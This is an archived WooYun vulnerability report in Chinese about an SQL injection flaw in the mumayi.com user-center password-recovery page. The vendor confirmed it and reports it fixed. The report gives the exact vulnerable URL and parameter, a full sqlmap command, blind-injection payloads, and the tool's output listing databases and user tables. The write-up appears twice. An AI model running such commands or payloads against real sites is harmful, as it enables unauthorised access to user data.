{"id": 47359, "wybug_id": "wooyun-2014-087016", "wybug_title": "木蚂蚁关键平台sql注入(大量信息泄露、涉及用户库)", "wybug_corp": "mumayi.com", "wybug_author": "玉林嘎", "wybug_date": "2014-12-13 16:28", "wybug_open_date": "2015-01-27 16:30", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-12-13：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-12-13：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-12-23：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-01-02：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-01-12：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-01-27：\t细节向公众公开  简要描述： rt 详细说明：  木蚂蚁用户中心 找回密码出存在sql注入http://u.mumayi.com/?a=retrievepass本身设计的也有问题 可以根据id来查看用户名 直接可以爬取所有用户 (友情提示)http://u.mumayi.com/?a=checkuserfieldpost:field=username&value=111 （value存在注入）sqlmap -u \"http://u.mumayi.com/?a=checkuserfield\" --data \"field=username&value=111\" -p \"value\"\nsqlmap identified the following injection points with a total of 122 HTTP(s) requests:---Place: POSTParameter: value    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: field=username&value=111') AND 5814=5814 AND ('QfaY'='QfaY    Type: AND/OR time-based blind    Title: MySQL > 5.0.11 AND time-based blind    Payload: field=username&value=111') AND SLEEP(5) AND ('PPiA'='PPiA---[14:30:50] [INFO] the back-end DBMS is MySQLweb application technology: Nginx, PHP 5.3.21back-end DBMS: MySQL 5.0.11\n--dbs\navailable databases [9]:[*] information_schema[*] mumayipay_mumayi[*] mysql[*] oauth[*] performance_schema[*] test[*] uc[*] uc_mumayi[*] ucenter\n--current-user\ncurrent user:    'ucenter@localhost'\n\nDatabase: ucenter[31 tables]+---------------------+| uc_admins           || uc_applications     || uc_badwords         || uc_domains          || uc_failedlogins     || uc_feeds            || uc_friends          || uc_mailqueue        || uc_memberfields     || uc_members          || uc_mergemembers     || uc_newpm            || uc_notelist         || uc_pm_indexes       || uc_pm_lists         || uc_pm_members       || uc_pm_messages_0    || uc_pm_messages_1    || uc_pm_messages_2    || uc_pm_messages_3    || uc_pm_messages_4    || uc_pm_messages_5    || uc_pm_messages_6    || uc_pm_messages_7    || uc_pm_messages_8    || uc_pm_messages_9    || uc_protectedmembers || uc_settings         || uc_sqlcache         || uc_tags             || uc_vars             |+---------------------+\n狗哥说的敏感数据观 我很赞同，点到为止   漏洞证明：  木蚂蚁用户中心 找回密码出存在sql注入http://u.mumayi.com/?a=retrievepass本身设计的也有问题 可以根据id来查看用户名 直接可以爬取所有用户 (友情提示)http://u.mumayi.com/?a=checkuserfieldpost:field=username&value=111 （value存在注入）sqlmap -u \"http://u.mumayi.com/?a=checkuserfield\" --data \"field=username&value=111\" -p \"value\"\nsqlmap identified the following injection points with a total of 122 HTTP(s) requests:---Place: POSTParameter: value    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: field=username&value=111') AND 5814=5814 AND ('QfaY'='QfaY    Type: AND/OR time-based blind    Title: MySQL > 5.0.11 AND time-based blind    Payload: field=username&value=111') AND SLEEP(5) AND ('PPiA'='PPiA---[14:30:50] [INFO] the back-end DBMS is MySQLweb application technology: Nginx, PHP 5.3.21back-end DBMS: MySQL 5.0.11\n--dbs\navailable databases [9]:[*] information_schema[*] mumayipay_mumayi[*] mysql[*] oauth[*] performance_schema[*] test[*] uc[*] uc_mumayi[*] ucenter\n--current-user\ncurrent user:    'ucenter@localhost'\n\nDatabase: ucenter[31 tables]+---------------------+| uc_admins           || uc_applications     || uc_badwords         || uc_domains          || uc_failedlogins     || uc_feeds            || uc_friends          || uc_mailqueue        || uc_memberfields     || uc_members          || uc_mergemembers     || uc_newpm            || uc_notelist         || uc_pm_indexes       || uc_pm_lists         || uc_pm_members       || uc_pm_messages_0    || uc_pm_messages_1    || uc_pm_messages_2    || uc_pm_messages_3    || uc_pm_messages_4    || uc_pm_messages_5    || uc_pm_messages_6    || uc_pm_messages_7    || uc_pm_messages_8    || uc_pm_messages_9    || uc_protectedmembers || uc_settings         || uc_sqlcache         || uc_tags             || uc_vars             |+---------------------+\n狗哥说的敏感数据观 我很赞同，点到为止   修复方案：  好好过滤   版权声明：转载请注明来源 玉林嘎@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：7  确认时间：2014-12-13 20:54 厂商回复： 技术蚂蚁正在处理 最新状态： 2014-12-15：已经修复完毕，感谢  ", "replys": "漏洞评价：\n评论\n     2014-12-13 22:48 |    \t\t玉林嘎 \t\t\t( 普通白帽子  |\t\t\t        Rank:758 漏洞数:96        )\t\t \n  @木蚂蚁应用市场 手机端的也存在噢，记得一起修复了    \n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 7, "Ranks": null}